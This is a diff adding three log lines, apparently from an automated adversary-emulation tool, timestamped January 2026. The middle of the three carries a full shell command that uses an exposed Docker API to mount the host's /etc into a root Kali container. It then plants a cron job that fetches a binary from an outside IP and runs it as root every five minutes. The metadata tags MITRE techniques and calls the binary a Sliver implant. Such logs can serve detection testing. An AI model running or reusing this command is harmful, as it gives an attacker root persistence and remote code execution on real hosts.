@@ -1,0 +1,3 @@
+2026-01-21 10:37:19 INFO - Executing Shell-Command: 'docker -H tcp://localhost:1090 run --rm -t -u root --network=nextcloud_default -v /etc:/root/etc  kalilinux/kali-rolling bash -c "echo \"*/5 * * * * root test -e /opt/tool || curl http://192.42.1.174:8888/tool > /opt/tool && chmod +x /opt/tool && /opt/tool\" > /root/etc/cron.d/sysvz"'
+2026-01-21 10:37:19 INFO - Metadata: {"techniques": "T1610,T1525,T1053.003,T1210", "tactics": "Defense Evasion,Execution,Persistence,Privilege Escalation,Lateral Movement", "description": "Attacker mounts etc-directory of the host into a container and creates a cron-job in it that executes the sliver-implant as root outside of the container"}
+2026-01-21 10:37:54 INFO - Sleeping 360 seconds
